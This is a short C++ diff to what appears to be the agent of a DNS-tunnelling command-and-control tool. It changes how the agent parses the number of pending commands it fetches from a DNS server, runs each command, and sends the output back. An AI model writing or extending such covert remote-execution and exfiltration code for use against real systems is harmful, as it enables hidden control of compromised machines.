@@ -17,13 +17,12 @@ int main(){
 		if (response.find("There were no commands") == std::string::npos){
 			if (response.find("NR:")!= std::string::npos){
 				// This gets the number of commands from the DNS server.
-				response.erase(0,(int)response.find("\"") + 4);
-				numberOfCommands = atoi(response.erase(response.length()-1,response.length()).c_str());
+				response.erase(0,(int)response.find(":")+1);
+				numberOfCommands = atoi(response.c_str());
 				for(i=0;i<numberOfCommands;i++){
 					// The parsing sucks but maybe I will fix it in the future.
 					tmp_command = SendDNSPacket(agentName,CMD,NULL);
 					tmp_command.erase(0,(int)tmp_command.find("CMD:") + 4);
-					tmp_command.erase((int)tmp_command.length()-2,(int)tmp_command.length());
 					SendData(agentName,const_cast<char*>(HandleCommand(tmp_command.c_str())));
 				}
 			}
